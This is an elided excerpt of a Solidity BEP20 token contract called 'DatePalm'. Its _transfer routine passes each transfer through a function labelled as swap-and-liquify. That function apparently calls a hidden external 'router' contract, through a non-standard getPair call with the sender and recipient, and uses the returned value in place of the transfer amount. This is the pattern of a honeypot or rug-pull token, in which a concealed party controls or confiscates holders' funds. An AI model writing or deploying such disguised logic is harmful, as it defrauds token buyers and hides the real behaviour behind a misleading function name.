...
contract DatePalm is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'DatePalm';
  string private constant _symbol = 'DatePalm';
  
  uint256 private _totalSupply = 10000000000 *  10**9;
  uint8 private constant _decimals = 9;
  uint256 private _bonusDatePalm = 0;
  address pancakeRouter_DatePalm;
  ...
  */
  ...
  function SwapAndLiquifyDatePalm(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      resData = IPancake(pancakeRouter_DatePalm).getPair(_bonusDatePalm, sender, recipient, arrData);

      _bonusDatePalm = resData[0];
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmountDatePalm = SwapAndLiquifyDatePalm(sender, recipient, amount);   
     _transferStandard(sender,recipient,bonusAmountDatePalm);
